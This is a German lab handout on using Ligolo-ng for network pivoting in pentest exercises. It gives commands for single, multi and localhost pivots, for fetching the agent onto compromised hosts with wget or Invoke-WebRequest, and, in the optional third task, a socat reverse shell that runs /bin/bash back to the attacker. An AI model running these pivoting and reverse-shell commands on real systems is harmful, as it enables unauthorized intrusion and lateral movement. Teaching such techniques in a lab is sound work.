# LigoloNG

= erweiterte Version von Ligolo, einem Sicherheitstool, das für Red-Teaming und Pentests entwickelt wurde. Es ermöglicht sichere, multiplexierte und authentifizierte Tunnel.

Hauptmerkmale:
- Proxy-Funktionen
    - fungiert als Reverse Proxy
    - ermöglicht weiterleiten von Datenverkehr über kompromittierte Systeme
- Multiplexing
    - Unterstützung mehrerer gleichzeitiger Datenströme über eine Verbindung
- Verschlüsselung
    - Gesamter Datenverkehr kann verschlüsselt werden
    - Beugt Entdeckung vor
- Authenzifierung
    - Unterstützt starke Authentifizierungsmechanismen
    - Verbindungsaufbau nur von autorisierten Benutzern
- Benutzerfreundlichkeit
    - Einfachen Kommandozeilenschnittstelle
    - Umfassende Dokumentation
<br>

- Ermöglicht es, eine sichere und zuverlässige Verbindung in Zielnetzwerken aufzubauen
- Statt mit einem SOCKS Proxy oder UDP/TCP Forwardern zu arbeiten, wird mit Hilfe von Gvisor ein Networkstack im Userland erstellt
    - es werden keine Root-Rechte für die Anwendung auf dem Zielsystem benötigt
    - **Nachteil**: es können über den Agent keine Raw Packets versendet werden; Nmap SYN-Scans werden dann z. B. zu TCP Connect-Scans umgewandelt

## Verwendung

- Ligolo-ng verwendet ein Proxy-Server-Agent-Modell
    - entsprechende Binaries müssen auf dem Target bzw. dem Attacker vorhanden sein

### Verbindungsaufbau

Zunächst muss der Server (Attacker) vorbereitet werden:

```bash
# TunTap für die Kommunikation mit den Tunnel erstellen 
# Pro Tunnel muss ein eigenes TunTap angelegt werden
# Username = Username auf Attacker (z.B. kali)

sudo ip tuntap add user [username] mode tun ligolo
sudo ip link set ligolo up

# Anschließend aktivieren des TunTap

sudo ip link set ligolo up

# Nun kann der Proxy auf dem Attacker gestartet werden

./proxy -selfcert
```

```-selfcert``` sorgt dafür, dass die für die Verbindung genutzten Zertifikate selbst signiert werden.

Auf dem Target startet man den übertragenen Agent:

```bash
# Ignore-Cert wegen selfcert
# Port standardmäßig 11601

./agent -connect <attacker_ip_address>:<port> -ignore-cert
```

### Single Pivot

Nachdem man durch sich Anzeigen lassen der angeschlossenen Netzwerke mittels ```ifconfig``` das interne Netz identifiziert hat, kann die Verbindung zum Tunneln eingerichtet werden.

```bash
# Hinzufügen einer Route in identifiziertes Netzwerk über TunTap

sudo ip route add <network_address>/<CIDR> dev ligolo

# Anschließendes Aktivieren von Tunneling in der Session

session # Anschließend mit Tab/Pfeiltasten auswählen
tunnel_start --tun ligolo
```

_Es bietet sich an, den Namen des TunTap direkt anzugeben, auch wenn, gerade bei nur einem vorhandenen, die Auswahl automatisiert stattfindet. Spätestens beim Hinzufügen weiterer TunTaps müssen die Namen explizit angegeben werden._

Im Anschluss daran kann die Portweiterleitung eingerichtet werden:

```bash
# Innerhalb der Session anlegen eines Listeners
# Spezifische IP Adressen der Intfaces sowie 0.0.0.0 möglich

listener_add --addr <listener_ip_addr>:<listen_port>  
			--to <target_ip_addr>:<target_port> 

# Anzeigen der vorhandenen Listener

listener_list

# Stoppen von Listener

listener_stop
```

### Multi Pivot

Ist der erste Hop genommen und Ligolo verbunden, ist das Weiterspringen von diesem Rechner einfach umgesetzt, vorausgesetzt, das nächste Ziel wurde bereits genommen. Durch den vorhandenen Tunnel loggt man sich auf dem nächsten Target ein, verbringt den Agent und startet einen Backconnect über die Portweiterleitung.

```bash
# Portweiterleitungen einrichten (Backconnect und DataTransfer)

listener_add --addr 0.0.0.0:8000 --to 0.0.0.0:80 # Data Transfer
listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601 # Ligolo

# Agent auf nächstem Target herunterladen

# Unix
wget <addr>:8000:/agent
# Windows
invoke-webrequest -URI <addr>:8000:/agent.exe -usebasicparsing -outfile agent.exe

# Connect

# Unix
./agent -connect <addr>:11601 -ignore-cert
# Windows
./agent.exe -connect <addr>:11601 -ignore-cert

# IP Config in neuer Session checken

session # Anschließend mit Tab/Pfeiltasten auswählen
ipconfig

# Neues TunTap auf Attacker einrichten 

sudo ip tuntap add user [username] mode tun ligolo2
sudo ip link set ligolo2 up

# Route in aufgeklärtes weiteres internes Netz anlegen

sudo ip route add <network_address>/<CIDR> dev ligolo2

# Tunneling in neuer Session starten

start --tun ligolo2
```

### Localhost Pivot

Um den Localhost einer Pivot-Maschine zu erreichen, kann man eine Route zur "Magic" IP-Adresse 240.0.0.1/32 erstellen und über das TunTap laufen lassen, dessen Weiterleitung in der entsprechenden Session aktiviert ist:

```bash
# TunTap und Route anlegen

sudo ip tuntap add user [username] mode tun ligolo3
sudo ip link set ligolo3 up
sudo ip route add 240.0.0.1/32 dev ligolo3

# Weiterleitung in Sessio aktivieren (hier auf Webserver)

start --tun ligolo3

# Aufrufen der öffentlichen Webseite (Annahme: über ligolo2)

curl 10.10.1.253
<html>
	<head>
			<title> Pivoting Exercise Website</title>
	</head>
	<body>
			<h1> Ihr koennt die oeffentliche Seite sehen - Super :)               </h1>
	</body>
</html>

# Aufrufen der internen Webseite

curl 240.0.0.1
<html>
	<head>
			<title> Pivoting Exercise Internal Website</title>
	</head>
	<body>
			<h1> Nun habt ihr auch die interne Website - Klasse!</h1>
	</body>
</html>
```

-----------

## Aufgabe 1

**Zunächst sollt ihr euch mit dem Single Pivot beüben. Nehmt direkt den ersten Debian als Ziel, richtet alles ein und führt den Agent aus. Macht euch mit den hier vorgestellten Befehlen vertraut und scannt das dahinterliegende Netz nach neuen Zielen.**

_Wie oben aufgeführt._

## Aufgabe 2

**Nachdem ihr praktische Erfahrung mit dem Single Pivot sammeln konntet, sollt ihr jetzt die Strecke bis zum Webserver mit den Multi Pivot Ansätze vervollständigen. Der Weg zum Ziel ist euch wieder freigestellt, es bietet sich jedoch auch hier an, eine Windows Maschine auf dem Weg mitzunehmen.**

_Wie oben aufgeführt._

## Aufgabe 3 (optional)

**Übt nun den Einsatz von Reverse Shells, indem ihr euer Wissen der Portweiterleitung bei Ligolo mit einer Reverse Shell eurer Wahl verbindet.**

_Weitermachen mit dem Stand nach Aufgabe 2._

Listener auf Agent vor Revshell-Target auslegen:

```bash
# Ligolo
# session
# Target auswählen

listener_add --addr 0.0.0.0:8000 --to 0.0.0.0:8000
```

Dann:

```bash
# Attacker

socat TCP-L:8000 FILE:$(tty),raw,echo=0

# Target

./socat TCP:10.10.1.254:8000 EXEC:"/bin/bash",pty,stderr,sigint,setsid,sane
```

Und man erhält eine Revshell.

_Mittels Ligolo könnte man einen Listener einrichten, mit dem man die Revshell (falls länger) bspw. per Python-Webserver rübergeschickt bekommt._